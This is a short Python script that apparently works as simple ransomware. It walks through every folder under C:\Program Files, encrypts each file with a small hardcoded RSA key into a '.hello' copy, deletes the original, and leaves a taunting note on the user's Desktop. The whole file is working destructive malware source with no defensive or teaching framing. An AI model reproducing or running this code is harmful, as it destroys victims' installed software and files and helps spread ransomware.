import os
from os.path import expanduser

def encrypt(file, path):
	N = 10403
	d = 6029
	e = 269

	f1 = open(path+"\\"+file, "rb")
	f2 = open(path+"\\"+file+".hello", "wb")

	arr = f1.read()

	f1.close()

	for i in arr:
		a = ((i**e) % N).to_bytes(2, 'big') 
		f2.write(a)

	f2.close()


home = expanduser("~")
f = open(home+"\\Desktop\\Hi!.txt", "w")
f.write("Find borichan ^^")

for (path, dire, files) in os.walk("C:\\Program Files"):
	file = os.listdir(path)
	for enfiles in file:
		if(os.path.isdir(path+"\\"+enfiles) == 1): 
			continue
		encrypt(enfiles, path)
		os.remove(path+"\\"+enfiles)